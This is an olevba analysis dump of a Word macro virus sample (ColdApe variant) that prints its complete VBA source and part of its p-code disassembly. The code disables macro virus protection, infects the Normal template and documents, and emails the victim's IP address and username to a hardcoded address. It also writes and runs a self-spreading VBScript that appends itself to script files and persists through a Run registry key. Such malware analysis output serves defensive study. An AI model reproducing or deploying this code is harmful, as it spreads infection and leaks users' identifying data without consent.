olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.ColdApe.ae
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.ColdApe.ae - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'AVM
On Error Resume Next
Dim DC, IT As Integer
A = ActiveDocument.Saved
Application.EnableCancelKey = 1 And 0
Options.VirusProtection = 1 And 0
Options.ConfirmConversions = 1 And 0
Options.SaveNormalPrompt = 1 And 0
gen = 67
Dim theApp, theNameSpace, theMailItem
Dim IPSocket
On Error Resume Next
Set IPSocket = CreateObject("MSWinsock.Winsock")
IPADDY = IPSocket.LocalIP
Set BOB = CreateObject("Wscript.Network")
For X = 1 To 2
If X = 1 Then EMADDY = "hia@uidivo.deltanet.ro" Else EMADDY = "hia@uidivo.deltanet.ro"
If X = 1 Then MSGBDY = IPADDY & " 57 11/15/2000 8:29:06 PM" Else MSGBDY = "Dear Nicky... my name is 11111 and I want to make hot monkey love with you. You anti-virus stud!"
Set theApp = WScript.CreateObject("Outlook.Application")
Set theNameSpace = theApp.GetNameSpace("MAPI")
theNameSpace.Logon "profile", "password"
Set theMailItem = theApp.CreateItem(0)
theMailItem.Recipients.Add EMADDY
theMailItem.Subject = BOB.UserName
theMailItem.Body = MSGBDY
theMailItem.Send
theNameSpace.Logoff
Next




If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'AVM" Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines, "'" & Application.UserName & " Loves Nicky F. Also! " & Now
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines - 1))
gen = gen + 1
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 10, "gen =" & Str(gen)
End If
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'AVM" Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines - 1))
gen = gen + 1
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 10, "gen =" & Str(gen)
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
IT = (Day(Now))
If IT >= 30 Then IT = 0
DC = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-DC")
If DC = "" Or DC < IT Or IT = 0 Then
GoOk = True
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-DC") = IT
End If
TestCon = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-VBS")
If System.PrivateProfileString("", "HKEY_CLASSES_ROOT\VBSFile\ScriptEngine", "") = "VBScript" Then SIY = True
If SIY = True And TestCon <> "Done" Then
Open "c:\happy.vbs" For Output As 1
Print #1, "'§"
Print #1, ""
Print #1, "On Error Resume Next"
Print #1, "Dim IV6, U187, IV7, IV1, IV2, IV3, IV4"
Print #1, "Dim T111"
Print #1, "Dim IV5(200)"
Print #1, "Dim XR"
Print #1, "Set WSHShell = Wscript.CreateObject(""Wscript.Shell"")"
Print #1, "Set WshSysEnv = WSHShell.Environment(""Process"")"
Print #1, "IV10 = WshSysEnv(""Path"")"
Print #1, "IV7 = WSHShell.ExpandEnvironmentStrings(""%windir%\avm.vbs"")"
Print #1, "IV1 = Wscript.ScriptFullName"
Print #1, "Set IV6 = CreateObject(""Scripting.FileSystemObject"")"
Print #1, "XR = 1"
Print #1, "T11 = Wscript.ScriptFullName"
Print #1, "For x = Len(IV10) To 1 Step -1"
Print #1, "IV4 = Mid(IV10, x, 1)"
Print #1, "If IV4 <> "";"" Then"
Print #1, "IV5(XR) = IV4 + IV5(XR)"
Print #1, "ElseIf IV4 = "";"" Then"
Print #1, "IV5(XR) = IV5(XR) + ""\"""
Print #1, "XR = XR + 1"
Print #1, "End If"
Print #1, "Next"
Print #1, "IV5(XR) = IV5(XR) + ""\"""
Print #1, "IV5(XR + 1) = WSHShell.SpecialFolders(""Desktop"") + ""\"""
Print #1, "IV5(XR + 2) = WSHShell.SpecialFolders(""MyDocuments"") + ""\"""
Print #1, "IV5(XR + 3) = WSHShell.SpecialFolders(""Startup"") + ""\"""
Print #1, "IV5(XR + 4) = Left(T11, InStrRev(T11, ""\""))"
Print #1, "Set TS = IV6.OpenTextFile(T11, 1)"
Print #1, "IV9 = TS.ReadAll"
Print #1, "TS.Close"
Print #1, "IV8 = Chr(167)"
Print #1, "endIV8 = ""'"" & IV8"
Print #1, "For x = Len(IV9) To 1 Step -1"
Print #1, "If Mid(IV9, x, 1) = IV8 Then"
Print #1, "x = 1"
Print #1, "IV3 = endIV8 + IV3"
Print #1, "ElseIf Mid(IV9, x, 1) <> IV8 Then"
Print #1, "IV3 = Mid(IV9, x, 1) + IV3"
Print #1, "End If"
Print #1, "Next"
Print #1, "For y = 1 To (XR + 4)"
Print #1, "For Each Target In IV6.GetFolder(IV5(y)).Files"
Print #1, "If UCase(Right(Target.Name, 3)) = ""VBS"" Then"
Print #1, "IV11 = """""
Print #1, "Set TS = IV6.OpenTextFile(IV5(y) & Target.Name, 1)"
Print #1, "IV11 = TS.ReadAll"
Print #1, "TS.Close"
Print #1, "If mid(IV11,(len(IV11)-2),1) <> ""¥"" Then"
Print #1, "Set TS = IV6.OpenTextFile(IV5(y) & Target.Name, 8)"
Print #1, "TS.Write IV3"
Print #1, "TS.Close"
Print #1, "End If"
Print #1, "End If"
Print #1, "Next"
Print #1, "Next"
Print #1, "FIV11 (IV7)"
Print #1, "If T111 = False Then"
Print #1, "WSHShell.RegWrite ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AVM"", IV7"
Print #1, "Set U187 = IV6.OpenTextFile(IV7, 2, True)"
Print #1, "U187.Write IV3"
Print #1, "U187.Close"
Print #1, "End If"
Print #1, "Function FIV11(filespec)"
Print #1, "Set IV6 = CreateObject(""Scripting.FileSystemObject"")"
Print #1, "If (IV6.FileExists(filespec)) Then"
Print #1, "T111 = True"
Print #1, "Else"
Print #1, "T111 = False"
Print #1, "End If"
Print #1, "End Function"
Print #1, "' Nick ""The Love Monkey"" Virus Package by ALT-F4 and ALT-F11 for the Alternative Virus Mafia"
Print #1, "'¥"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-VBS") = "Done"
Close 1
Shell "wscript c:\happy.vbs", vbHide
End If





Open "c:\A4.vbs" For Output As 1
Print #1, "Dim theApp, theNameSpace, theMailItem"
Print #1, "Dim IPSocket"
Print #1, "On Error Resume Next"
Print #1, "Set IPSocket = CreateObject(""MSWinsock.Winsock"")"
Print #1, "IPADDY = IPSocket.LocalIP"
Print #1, "set BOB = CreateObject(""Wscript.Network"")"
Print #1, "For x = 1 To 2"
Print #1, "If x = 1 Then EMADDY = ""hia@uidivo.deltanet.ro"" Else EMADDY = ""hia@uidivo.deltanet.ro"""
Print #1, "if x = 1 then MSGBDY = IPADDY & " & Chr(34) & Str(gen) & " " & Now & Chr(34) & " else MSGBDY = ""Dear Nicky... my name is " & Application.UserName & " and I want to make hot monkey love with you. You anti-virus stud!"""
Print #1, "Set theApp = WScript.CreateObject(""Outlook.Application"")"
Print #1, "Set theNameSpace = theApp.GetNameSpace(""MAPI"")"
Print #1, "theNameSpace.Logon ""profile"", ""password"""
Print #1, "Set theMailItem = theApp.CreateItem(0)"
Print #1, "theMailItem.Recipients.Add EMADDY"
Print #1, "theMailItem.Subject = BOB.Username"
Print #1, "theMailItem.Body = MSGBDY"
Print #1, "theMailItem.Send"
Print #1, "theNameSpace.Logoff"
Print #1, "Next"
Print #1, theMailItem.Recipients
Print #1, theNameSpace
Close 1
Shell "wscript c:\a4.vbs", vbHide
If ActiveDocument.Saved <> A Then ActiveDocument.Saved = A
' Nick "The Love Monkey" v2 Virus Package by ALT-F4 and ALT-F11 for the Alternative Virus Mafia
'Hugh G. Rection Loves Nicky F. Also! 11/14/98 10:56:30 AM
'James Matthiessen Loves Nicky F. Also! 11/14/98 1:15:12 PM
'Russell Wigart Loves Nicky F. Also! 12/2/98 8:55:28 PM
'RYAN HANSEN Loves Nicky F. Also! 12/3/98 10:03:48 PM
'College of Agriculture Loves Nicky F. Also! 12/9/98 10:06:43 AM
'College of Agriculture Loves Nicky F. Also! 12/9/98 10:18:22 AM
'LR&C Loves Nicky F. Also! 12/9/98 12:22:53 PM
'Preferred Customer Loves Nicky F. Also! 1/6/99 3:13:52 PM
'Matthew Glagolich Loves Nicky F. Also! 1/15/99 3:15:17 PM
'steph Loves Nicky F. Also! 1/19/99 3:53:32 PM
'student Loves Nicky F. Also! 1/20/99 10:03:04 AM
'student Loves Nicky F. Also! 3/4/99 7:55:33 PM
'student Loves Nicky F. Also! 3/4/99 7:59:49 PM
'Soquani Wilde Loves Nicky F. Also! 3/8/99 3:24:11 PM
'Student Loves Nicky F. Also! 3/11/99 10:27:36 PM
'jaime allison Loves Nicky F. Also! 3/11/99 10:35:57 PM
'Student Loves Nicky F. Also! 4/11/99 9:02:42 PM
'Student Loves Nicky F. Also! 4/11/99 9:26:38 PM
'Student Loves Nicky F. Also! 4/13/99 3:17:22 PM
'Jason Kistenmacher Loves Nicky F. Also! 4/14/99 4:30:56 PM
'Student Loves Nicky F. Also! 4/26/99 12:18:33 PM
'Student Loves Nicky F. Also! 5/17/99 8:30:50 PM
'AIESEC Brasov Loves Nicky F. Also! 5/18/99 10:21:37 AM
'Raluca Loves Nicky F. Also! 27.05.1999 19:05:08
'Catalina Loves Nicky F. Also! 01.03.2000 10:10:06
'Catalina Loves Nicky F. Also! 13.03.2000 13:26:49
'Yogy Loves Nicky F. Also! 06/24/2000 04:13:28
'radu Loves Nicky F. Also! 27.07.2000 23:31:13
'nobody Loves Nicky F. Also! 7/25/2000 22:13:19
'cata Loves Nicky F. Also! 25.07.00 23:34:37
'Michael Horn Loves Nicky F. Also! 15.09.00 20:41:45
'11111 Loves Nicky F. Also! 11/15/2000 8:13:32 PM
End Sub
Private Sub Document_New()

'11111 Loves Nicky F. Also! 12/19/2000 8:56:44 PM
'Total Konfuzion Loves Nicky F. Also! 04.12.00 12:57:03
'Righard J. Zwienenberg Loves Nicky F. Also! 1/9/01 11:26:58 AM
'Replication System Loves Nicky F. Also! 11/01/01 16:19:57
'Total Konfuzion Loves Nicky F. Also! 22.02.01 10:59:07
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.ColdApe.ae
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 17037 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x0003 "AVM"
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Dim 
' 	VarDefn DC
' 	VarDefn IT (As Integer)
' Line #4:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St A 
' Line #5:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	And 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #6:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	And 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	And 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #8:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	And 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #9:
' 	LitDI2 0x0043 
' 	St gen 
' Line #10:
' 	Dim 
' 	VarDefn theApp
' 	VarDefn theNameSpace
' 	VarDefn theMailItem
' Line #11:
' 	Dim 
' 	VarDefn IPSocket
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	SetStmt 
' 	LitStr 0x0011 "MSWinsock.Winsock"
' 	ArgsLd CreateObject 0x0001 
' 	Set IPSocket 
' Line #14:
' 	Ld IPSocket 
' 	MemLd LocalIP 
' 	St IPADDY 
' Line #15:
' 	SetStmt 
' 	LitStr 0x000F "Wscript.Network"
' 	ArgsLd CreateObject 0x0001 
' 	Set BOB 
' Line #16:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #17:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0016 "hia@uidivo.deltanet.ro"
' 	St EMADDY 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0016 "hia@uidivo.deltanet.ro"
' 	St EMADDY 
' 	EndIf 
' Line #18:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld IPADDY 
' 	LitStr 0x0019 " 57 11/15/2000 8:29:06 PM"
' 	Concat 
' 	St MSGBDY 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0060 "Dear Nicky... my name is 11111 and I want to make hot monkey love with you. You anti-virus stud!"
' 	St MSGBDY 
' 	EndIf 
' Line #19:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	Ld WScript 
' 	ArgsMemLd CreateObject 0x0001 
' 	Set theApp 
' Line #20:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld theApp 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set theNameSpace 
' Line #21:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld theNameSpace 
' 	ArgsMemCall Logon 0x0002 
' Line #22:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld theApp 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set theMailItem 
' Line #23:
' 	Ld EMADDY 
' 	Ld theMailItem 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #24:
' 	Ld BOB 
' 	MemLd UserName 
' 	Ld theMailItem 
' 	MemSt Subject 
' Line #25:
' 	Ld MSGBDY 
' 	Ld theMailItem 
' 	MemSt Body 
' Line #26:
' 	Ld theMailItem 
' 	ArgsMemCall Send 0x0000 
' Line #27:
' 	Ld theNameSpace 
' 	ArgsMemCall Logoff 0x0000 
' Line #28:
' 	StartForVariable 
' 	Next 
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'AVM"
' 	Ne 
' 	IfBlock 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " Loves Nicky F. Also! "
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #35:
' 	LitStr 0x000F "Sub AutoClose()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #36:
' 	Ld gen 
' 	LitDI2 0x0001 
' 	Add 
' 	St gen 
' Line #37:
' 	LitDI2 0x000A 
' 	LitStr 0x0005 "gen ="
' 	Ld gen 
' 	ArgsLd Str 0x0001 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'AVM"
' 	Ne 
' 	IfBlock 
' Line #40:
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #41:
' 	Ld gen 
' 	LitDI2 0x0001 
' 	Add 
' 	St gen 
' Line #42:
' 	LitDI2 0x000A 
' 	LitStr 0x0005 "gen ="
' 	Ld gen 
' 	ArgsLd Str 0x0001 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #43:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Paren 
' 	St IT 
' Line #46:
' 	Ld IT 
' 	LitDI2 0x001E 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St IT 
' 	EndIf 
' Line #47:
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x0006 "AVM-DC"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St DC 
' Line #48:
' 	Ld DC 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Ld DC 
' 	Ld IT 
' 	Lt 
' 	Or 
' 	Ld IT 
' 	LitDI2 0x0000 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #49:
' 	LitVarSpecial (True)
' 	St GoOk 
' Line #50:
' 	Ld IT 
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x0006 "AVM-DC"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x0007 "AVM-VBS"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St TestCon 
' Line #53:
' 	LitStr 0x0000 ""
' 	LitStr 0x0026 "HKEY_CLASSES_ROOT\VBSFile\ScriptEngine"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0008 "VBScript"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St SIY 
' 	EndIf 
' Line #54:
' 	Ld SIY 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld TestCon 
' 	LitStr 0x0004 "Done"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #55:
' 	LitStr 0x000C "c:\happy.vbs"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "'§"
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On Error Resume Next"
' 	PrintItemNL 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "Dim IV6, U187, IV7, IV1, IV2, IV3, IV4"
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "Dim T111"
' 	PrintItemNL 
' Line #61:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "Dim IV5(200)"
' 	PrintItemNL 
' Line #62:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Dim XR"
' 	PrintItemNL 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "Set WSHShell = Wscript.CreateObject("Wscript.Shell")"
' 	PrintItemNL 
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002F "Set WshSysEnv = WSHShell.Environment("Process")"
' 	PrintItemNL 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "IV10 = WshSysEnv("Path")"
' 	PrintItemNL 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003B "IV7 = WSHShell.ExpandEnvironmentStrings("%windir%\avm.vbs")"
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "IV1 = Wscript.ScriptFullName"
' 	PrintItemNL 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "Set IV6 = CreateObject("Scripting.FileSystemObject")"
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "XR = 1"
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "T11 = Wscript.ScriptFullName"
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "For x = Len(IV10) To 1 Step -1"
' 	PrintItemNL 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "IV4 = Mid(IV10, x, 1)"
' 	PrintItemNL 
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "If IV4 <> ";" Then"
' 	PrintItemNL 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "IV5(XR) = IV4 + IV5(XR)"
' 	PrintItemNL 
' Line #75:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "ElseIf IV4 = ";" Then"
' 	PrintItemNL 
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "IV5(XR) = IV5(XR) + "\""
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "XR = XR + 1"
' 	PrintItemNL 
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #79:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Next"
' 	PrintItemNL 
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "IV5(XR) = IV5(XR) + "\""
' 	PrintItemNL 
' Line #81:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "IV5(XR + 1) = WSHShell.SpecialFolders("Desktop") + "\""
' 	PrintItemNL 
' Line #82:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003A "IV5(XR + 2) = WSHShell.SpecialFolders("MyDocuments") + "\""
' 	PrintItemNL 
' Line #83:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "IV5(XR + 3) = WSHShell.SpecialFolders("Startup") + "\""
' 	PrintItemNL 
' Line #84:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002B "IV5(XR + 4) = Left(T11, InStrRev(T11, "\"))"
' 	PrintItemNL 
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "Set TS = IV6.OpenTextFile(T11, 1)"
' 	PrintItemNL 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "IV9 = TS.ReadAll"
' 	PrintItemNL 
' Line #87:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "TS.Close"
' 	PrintItemNL 
' Line #88:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "IV8 = Chr(167)"
' 	PrintItemNL 
' Line #89:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "endIV8 = "'" & IV8"
' 	PrintItemNL 
' Line #90:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "For x = Len(IV9) To 1 Step -1"
' 	PrintItemNL 
' Line #91:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "If Mid(IV9, x, 1) = IV8 Then"
' 	PrintItemNL 
' Line #92:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "x = 1"
' 	PrintItemNL 
' Line #93:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "IV3 = endIV8 + IV3"
' 	PrintItemNL 
' Line #94:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "ElseIf Mid(IV9, x, 1) <> IV8 Then"
' 	PrintItemNL 
' Line #95:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "IV3 = Mid(IV9, x, 1) + IV3"
' 	PrintItemNL 
' Line #96:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #97:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Next"
' 	PrintItemNL 
' Line #98:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "For y = 1 To (XR + 4)"
' 	PrintItemNL 
' Line #99:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "For Each Target In IV6.GetFolder(IV5(y)).Files"
' 	PrintItemNL 
' Line #100:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "If UCase(Right(Target.Name, 3)) = "VBS" Then"
' 	PrintItemNL 
' Line #101:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "IV11 = """
' 	PrintItemNL 
' Line #102:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "Set TS = IV6.OpenTextFile(IV5(y) & Target.Name, 1)"
